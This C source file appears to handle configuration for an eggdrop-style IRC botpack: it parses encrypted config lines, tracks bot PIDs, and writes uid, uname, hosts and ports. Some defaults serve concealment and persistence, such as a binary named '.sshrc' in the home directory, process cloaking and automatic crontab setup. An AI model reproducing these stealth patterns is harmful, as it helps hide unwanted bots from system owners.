/*
 * conf.c -- handles:
 * 
 * all of the conf handling
 */

#include "common.h"
#include "conf.h"
#include "shell.h"
#include "debug.h"
#include "crypt.h"
#include "salt.h"
#include "misc.h"

#include <errno.h>
#include <signal.h>
#include <pwd.h>
#include <sys/types.h>

extern char             origbotname[], botnetnick[], tempdir[],
                        userfile[], myip[], myip6[], natip[], hostname[], hostname6[];
extern int              localhub;
extern uid_t		myuid;
extern conf_t           conf;

conf_t		conf;		/* global conf struct */

static conf_t conffile;

void init_conf() {
  conffile.bots = (conf_bot *) calloc(1, sizeof(conf_bot));
  conffile.bots->nick = NULL;
  conffile.bots->next = NULL;

  conffile.comments = calloc(1, 1);
  conffile.autocron = 1;
  conffile.autouname = 0;
  conffile.binpath = strdup(STR("~/"));
  conffile.binname = strdup(STR(".sshrc"));
#ifdef HUB
  conffile.portmin = 1024;
  conffile.portmax = 65535;
#endif /* HUB */
#ifdef S_PSCLOAK
  conffile.pscloak = 1;
#else
  conffile.pscloak = 0;
#endif /* S_PSCLOAK */
  conffile.uid = 0;
  conffile.uname = NULL;
  conffile.username = NULL;
  conffile.homedir = NULL;
}
/*
 * Return the PID of a bot if it is running, otherwise return 0
 */

int checkpid(char *nick, conf_bot *bot) {
  FILE *f = NULL;
  int xx;
  char buf[DIRMAX] = "", s[11] = "";

  egg_snprintf(buf, sizeof buf, "%s.pid.%s", tempdir, nick);

  if (bot && !(bot->pid_file))
    bot->pid_file = strdup(buf);
  else if (bot && strcmp(bot->pid_file, buf))
    str_redup(&bot->pid_file, buf);

  if ((f = fopen(buf, "r"))) {
    fgets(s, 10, f);
    fclose(f);
    xx = atoi(s);
    kill(xx, SIGCHLD);
    if (errno != ESRCH) /* PID is !running */
      return xx;
  }
  return 0;
}

static void conf_addbot(char *nick, char *ip, char *host, char *ip6) {
  conf_bot *bot;

  for (bot = conffile.bots; bot && bot->nick; bot = bot->next)
    ;

  bot->next = (conf_bot *) calloc(1, sizeof(conf_bot));
  bot->next->next = NULL;
  bot->pid_file = NULL;
  bot->nick = strdup(nick);
#ifdef LEAF
  if (bot == conffile.bots) {
    bot->localhub = 1;          /* first bot */
    /* perhaps they did -B localhub-bot ? */
    if (origbotname[0] && !strcmp(origbotname, bot->nick))
      localhub = 1;
  }
#endif /* LEAF */

  bot->ip = NULL;
  bot->host = NULL;
  bot->ip6 = NULL;
  bot->host6 = NULL;

  if (host && host[0] == '+') {
    host++;
    bot->host6 = strdup(host);
  } else if (host) {
    bot->host = strdup(host);
  }
  if (ip)    bot->ip = strdup(ip);
  if (ip6)   bot->ip6 = strdup(ip6);

  bot->pid = checkpid(nick, bot);
}


void showconf() {
  conf_bot *bot;
  sdprintf("---------------------------CONF START---------------------------");
  sdprintf("uid      : %d", conffile.uid);
  sdprintf("uname    : %s", conffile.uname);
  sdprintf("username : %s", conffile.username);
  sdprintf("homedir  : %s", conffile.homedir);
  sdprintf("binpath  : %s", conffile.binpath);
  sdprintf("binname  : %s", conffile.binname);
#ifdef HUB
  sdprintf("portmin  : %d", conffile.portmin);
  sdprintf("portmax  : %d", conffile.portmax);
#endif /* HUB */
  sdprintf("pscloak  : %d", conffile.pscloak);
  sdprintf("autocron : %d", conffile.autocron);
  sdprintf("autouname: %d", conffile.autouname);
  for (bot = conffile.bots; bot && bot->nick; bot = bot->next)
    sdprintf("%s IP: %s HOST: %s IP6: %s HOST6: %s PID: %d PID_FILE: %s LOCALHUB %d", bot->nick, bot->ip, bot->host,
                 bot->ip6, bot->host6, bot->pid, bot->pid_file, bot->localhub);
  sdprintf("----------------------------CONF END----------------------------");
}

void free_conf() {
  conf_bot *bot, *bot_n;

  for (bot = conffile.bots; bot; bot = bot_n) {
    bot_n = bot->next;
    free(bot->nick);
    free(bot->pid_file);
    if (bot->ip)    free(bot->ip);
    if (bot->host)  free(bot->host);
    if (bot->ip6)   free(bot->ip6);
    if (bot->host6) free(bot->host6);
    /* must also free() anything malloc`d in conf_addbot() */
    free(bot);
  }
  free(conffile.uname);
  free(conffile.username);
  free(conffile.homedir);
  free(conffile.binname);
  free(conffile.binpath);
  free(conffile.comments);
}

int parseconf() {
  struct passwd *pw;

  if (conffile.uid && conffile.uid != myuid) {
    sdprintf("wrong uid, conf: %d :: %d", conffile.uid, myuid);
    werr(ERR_WRONGUID);
  } else if (!conffile.uid) {
    conffile.uid = myuid;
  }

  if (conffile.uname && strcmp(conffile.uname, my_uname()) && !conffile.autouname) {
    baduname(conffile.uname, my_uname());                       /* its not auto, and its not RIGHT, bail out. */
    sdprintf("wrong uname, conf: %s :: %s", conffile.uname, my_uname());
    werr(ERR_WRONGUNAME);
  } else if (conffile.uname && conffile.autouname) {    /* if autouname, dont bother comparing, just set uname to output */
    str_redup(&conffile.uname, my_uname());
  } else if (!conffile.uname) {                         /* if not set, then just set it, wont happen again next time... */
    conffile.uname = strdup(my_uname());
  }

  if ((pw = getpwuid(conffile.uid))) {

    if (conffile.username) {
      str_redup(&conffile.username, pw->pw_name);
    } else {
      conffile.username = strdup(pw->pw_name);
    }

    if (conffile.homedir) {
      str_redup(&conffile.homedir, pw->pw_dir);
    } else {
      conffile.homedir = strdup(pw->pw_dir);
    }

  } else {
    return 1;
  }
  return 0;
}

int readconf(char *cfile)
{
  FILE *f = NULL;
  int i = 0;
  char inbuf[8192] = "";

  Context;
  f = fopen(cfile, "r");
  while (fgets(inbuf, sizeof inbuf, f) != NULL) {
    char *line = NULL, *temp_ptr = NULL;

    line = temp_ptr = decrypt_string(SALT1, inbuf);
    i++;

    sdprintf("CONF LINE: %s", line);
    if (!strchr("*#-+!abcdefghijklmnopqrstuvwxyzABDEFGHIJKLMNOPWRSTUVWXYZ", line[0])) {
      sdprintf(STR("line %d, char %c "), i, line[0]);
      werr(ERR_CONFBADENC);
    } else {                    /* line is good to parse */
      /* - uid */
      if (line[0] == '-') {
        newsplit(&line);
        if (!conffile.uid)
          conffile.uid = atoi(line);

      /* + uname */
      } else if (line[0] == '+') {
        newsplit(&line);
        if (!conffile.uname)
          conffile.uname = strdup(line);

      /* ! is misc options */
      } else if (line[0] == '!') {
        char *option = NULL;

        newsplit(&line);
        option = newsplit(&line);

        if (!strcmp(option, "autocron")) {              /* automatically check/create crontab? */
          if (egg_isdigit(line[0]))
            conffile.autocron = atoi(line);

        } else if (!strcmp(option, "autouname")) {      /* auto update uname contents? */
          if (egg_isdigit(line[0]))
            conffile.autouname = atoi(line);

        } else if (!strcmp(option, "username")) {       /* shell username */
          conffile.username = strdup(line);

        } else if (!strcmp(option, "homedir")) {        /* homedir */
          conffile.homedir = strdup(line);

        } else if (!strcmp(option, "binpath")) {        /* path that the binary should move to? */
          str_redup(&conffile.binpath, line);

        } else if (!strcmp(option, "binname")) {        /* filename of the binary? */
          str_redup(&conffile.binname, line);

#ifdef HUB
        } else if (!strcmp(option, "portmin")) {
          if (egg_isdigit(line[0]))
            conffile.portmin = atoi(line);

        } else if (!strcmp(option, "portmax")) {
          if (egg_isdigit(line[0]))
            conffile.portmax = atoi(line);
#endif /* HUB */

        } else if (!strcmp(option, "pscloak")) {        /* should bots on this shell pscloak? */
          if (egg_isdigit(line[0]))
            conffile.pscloak = atoi(line);

        } else if (!strcmp(option, "uid")) {            /* new method uid */
          if (!conffile.uid && egg_isdigit(line[0]))
            conffile.uid = atoi(line);

        } else if (!strcmp(option, "uname")) {          /* new method uname */
          if (!conffile.uname)
            conffile.uname = strdup(line);

        } else {
          putlog(LOG_MISC, "*", "Unrecognized config option '%s'", option);

        }
#ifdef HUB
      /* read in portmin */
      } else if (line[0] == '>') {
        newsplit(&line);
        conffile.portmin = atoi(line);

      } else if (line[0] == '<') {
        newsplit(&line);
        conffile.portmax = atoi(line);
#endif /* HUB */

      /* now to parse nick/hosts */
      } else if (line[0] != '#') {
        char *nick = NULL, *host = NULL, *ip = NULL, *ipsix = NULL;

        nick = newsplit(&line);
        if (!nick || (nick && !nick[0]))
          werr(ERR_BADCONF);

        ip = newsplit(&line);
        host = newsplit(&line);
        ipsix = newsplit(&line);

        conf_addbot(nick, ip, host, ipsix);
      } else {
        conffile.comments = realloc(conffile.comments, strlen(conffile.comments) + strlen(line) + 1 + 1);
        strcat(conffile.comments, line);
        strcat(conffile.comments, "\n");
      }
    }
    free(temp_ptr);
  } /* while(fgets()) */
  fclose(f);

  return 0;
}

int writeconf(char *filename) {
  FILE *f = NULL;
  conf_bot *bot;

  if (!(f = fopen(filename, "w"))) {
    return 1;
  }
/* old
  lfprintf(f, "- %d\n", conffile.uid);
  lfprintf(f, "+ %s\n", conffile.uname);
*/
  lfprintf(f, "! uid %d\n", conffile.uid);
  lfprintf(f, "! uname %s\n", conffile.uname);
  lfprintf(f, "! username %s\n", conffile.username);
  lfprintf(f, "! homedir %s\n", conffile.homedir);
  lfprintf(f, "! binname %s\n", conffile.binname);
  lfprintf(f, "! binpath %s\n", conffile.binpath);
#ifdef HUB
/* old
  lfprintf(f, "> %d\n", conffile.portmin);
  lfprintf(f, "< %d\n", conffile.portmax);
*/
  lfprintf(f, "! portmin %d\n", conffile.portmin);
  lfprintf(f, "! portmax %d\n", conffile.portmax);
#endif /* HUB */
  lfprintf(f, "! pscloak %d\n", conffile.pscloak);
  lfprintf(f, "! autocron %d\n", conffile.autocron);
  lfprintf(f, "! autouname %d\n", conffile.autouname);

  for (bot = conffile.bots; bot && bot->nick; bot = bot->next) {
    lfprintf(f, "%s %s %s%s %s\n", bot->nick,
                                   bot->ip ? bot->ip : ".",
                                   bot->host6 ? "+" : "",
                                   bot->host ? bot->host : (bot->host6 ? bot->host6 : "."),
                                   bot->ip6 ? bot->ip6 : "");
  }
  lfprintf(f, "%s", conffile.comments);
  fflush(f);
  fclose(f);

  return 0;
}

static void conf_bot_dup(conf_bot *dest, conf_bot *src) {
  dest->nick =          src->nick ? strdup(src->nick) : NULL;
  dest->pid_file =      src->pid_file ? strdup(src->pid_file) : NULL;
  dest->ip =            src->ip ? strdup(src->ip) : NULL;
  dest->host =          src->host ? strdup(src->host) : NULL;
  dest->ip6 =           src->ip6 ? strdup(src->ip6) : NULL;
  dest->host6 =         src->host6 ? strdup(src->host6) : NULL;
  dest->pid =           src->pid;
#ifdef LEAF
  dest->localhub =      src->localhub;
#endif /* LEAF */
  dest->next = NULL;
}

void fillconf(conf_t *inconf) {
  conf_bot *bot;
  char *mynick = NULL;

  if (localhub)
    mynick = strdup(conffile.bots->nick);
  else
    mynick = strdup(origbotname);

  for (bot = conffile.bots; bot && bot->nick; bot = bot->next)
    if (!strcmp(bot->nick, mynick)) break;

  if (!bot->nick || (bot->nick && strcmp(bot->nick, mynick)))
    werr(ERR_BADBOT);

  free(mynick);
  inconf->bot = (conf_bot *) calloc(1, sizeof(conf_bot));
  conf_bot_dup(inconf->bot, bot);
  /* inconf->bot = bot; */
  /* inconf->bot->next = NULL; */
  inconf->autocron = conffile.autocron;
  inconf->autouname = conffile.autouname;
  inconf->binpath = conffile.binpath;
  inconf->binname = conffile.binname;
  inconf->uname = conffile.uname;
#ifdef HUB
  inconf->portmin = conffile.portmin;
  inconf->portmax = conffile.portmax;
#endif /* HUB */
  inconf->pscloak = conffile.pscloak;
  inconf->uid = conffile.uid;
}

